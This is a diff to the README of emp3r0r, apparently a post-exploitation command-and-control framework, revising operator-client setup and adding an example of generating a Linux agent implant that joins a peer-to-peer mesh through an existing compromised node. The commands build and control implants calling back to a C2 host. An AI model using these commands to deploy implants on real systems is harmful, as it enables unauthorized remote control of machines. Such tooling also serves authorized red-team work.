@@ -102,9 +102,10 @@ podman run -it --rm --cap-add=NET_ADMIN --device /dev/net/tun:/dev/net/tun \
 emp3r0r client --c2-port 13377 --server-wg-key '0OKqMZmJfLDhAQLST4MKtKNa6MKxVkLn3UcOP14sMA8=' --server-wg-ip '10.88.14.158' --operator-wg-ip '10.88.14.236' --operator-wg-key 'LOe4sUyjyyIS3Kjnmz0SpKJwvDGle0880Q73qzsMg48=' --c2-host <YOUR_PUBLIC_IP>
 ```
 
-And follow the instructions given by the `emp3r0r server`, transfer `emp3r0r-operator-kit.tar.zst` to your operator machine and install it. Then run `emp3r0r client`.
+And follow the on-screen instructions given by `emp3r0r server`. Transfer `emp3r0r-operator-kit.tar.zst` to your operator machine and install it.
 
 ```bash
+# Run the command given by emp3r0r server on your operator machin after installation
 emp3r0r client --operator-port 13377 --server-wg-key '0OKqMZmJfLDhAQLST4MKtKNa6MKxVkLn3UcOP14sMA8=' --server-wg-ip '10.88.14.158' --operator-wg-ip '10.88.14.236' --operator-wg-key 'LOe4sUyjyyIS3Kjnmz0SpKJwvDGle0880Q73qzsMg48=' --c2-host 1.2.3.4
 ```
 
@@ -122,9 +123,19 @@ generate --type linux_executable --arch amd64 --cc your.domain.com
 
 Example (mesh gateway):
 
+The gateway peer:
+
 ```bash
 generate --type linux_executable --arch amd64 --cc your.domain.com \
 	--p2p --direct-c2 --p2p-transport mtls
+```
+
+An intermediate peer:
+
+```bash
+# 1.2.3.4 is the pre-existing agent node that you want to use as bootstrap peer
+generate --type linux_executable --arch amd64 --cc your.domain.com \
+	--p2p --p2p-transport mtls --peers 1.2.3.4
 ```
 
 ---
